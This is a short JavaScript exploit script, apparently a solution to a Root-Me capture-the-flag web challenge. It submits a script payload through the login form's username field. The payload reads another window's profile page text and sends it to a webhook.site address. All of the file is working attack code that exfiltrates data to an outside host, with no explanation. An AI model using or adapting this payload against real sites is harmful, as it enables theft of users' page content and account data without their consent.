const ORIGIN = "https://tim-xd.github.io/web-client/index.html";
const LOGIN = "http://challenge01.root-me.org:58003/login";
const PROFILE = "http://challenge01.root-me.org:58003/profile";
const WEBHOOK = "https://webhook.site/091a3c43-0429-4c3c-a39d-3ea6b1045ce0";
const OPEN = "rootme";

function get(url) {
  let xhr = new XMLHttpRequest();
  xhr.open("GET", url, false);
  return xhr.send(null);
}

function post(url, data) {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", url, false);
  return xhr.send(data);
}

function imgEnd() {
  window.open(PROFILE, "toto");
  get(`${WEBHOOK}?end`);
  // document.location.href = WEBHOOK;
}

// const queryString = window.location.search;
// const urlParams = new URLSearchParams(queryString);
// const id = urlParams.get("id");

try {
  window.open(PROFILE, OPEN);

  const payload = `
function get(url) {
  let xhr = new XMLHttpRequest();
  xhr.open("GET", url, false);
  return xhr.send(null);
}

try {
  const profile = window.open("", "${OPEN}");
  get("${WEBHOOK}?" + profile.document.body.innerText);
} catch (error) {
  get("${WEBHOOK}?" + error);
}
`;
  document.getElementById("username").value = `<script>${payload}</script>`;
  document.getElementById("login").submit();

  setTimeout(() => imgEnd(), 4000);
} catch (error) {
  post(WEBHOOK, `Error: ${error}`);
}
